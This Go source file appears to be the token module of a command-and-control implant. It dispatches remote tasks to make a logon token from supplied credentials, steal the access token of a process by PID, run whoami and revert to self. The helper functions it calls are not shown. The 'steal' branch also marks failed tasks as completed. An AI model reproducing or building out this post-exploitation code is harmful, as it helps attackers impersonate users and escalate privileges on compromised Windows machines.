package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
	"strconv"
)

type Task struct {
	TaskId     string `json:"taskid"`
	TaskAction string `json:"taskaction"`
	Args       []string `json:"args"`

	// General Purpose
	status   string
	tasktype string

}

func InitialiseTask(task *Task) error {
	task.tasktype = "resptoken"
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	switch task.TaskAction {
	case "whoami":
		stdout, err = whoami()
		if err != nil {
			Println("Error Occured --> ", err.Error())
			task.status = "failed"
			return []byte(err.Error()), err
		}
		task.status = "completed"
		return stdout, nil
	case "make":
		//runtime.LockOSThread()
		//defer runtime.UnlockOSThread()
		Println(task.Args[0])
		Println(task.Args[1])
		Println(task.Args[2])
		stdout, err = maketoken(task.Args[0], task.Args[1], task.Args[2])
		if err != nil {
			Println("Error Occured --> ", err.Error())
			task.status = "failed"
			return []byte(err.Error()), err
		}
		task.status = "completed"
		return stdout, nil
	case "steal":
		pid, err := strconv.Atoi(task.Args[0])
		if err != nil {
			return []byte(err.Error()), err
		}
		stdout, err = stealToken(uint32(pid))
		if err != nil {
			Println("Error Occured --> ", err.Error())
			task.status = "failed"
		}
		task.status = "completed"
		return stdout, nil
	case "rev2self":
		stdout, err = rev2self()
		if err != nil {
			Println("Error Occured --> ", err.Error())
			task.status = "failed"
			return []byte(err.Error()), err
		}
		task.status = "completed"
		return stdout, nil
	default:
		task.status = "failed"
		return nil, fmt.Errorf("Token action not found")
		
	}
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
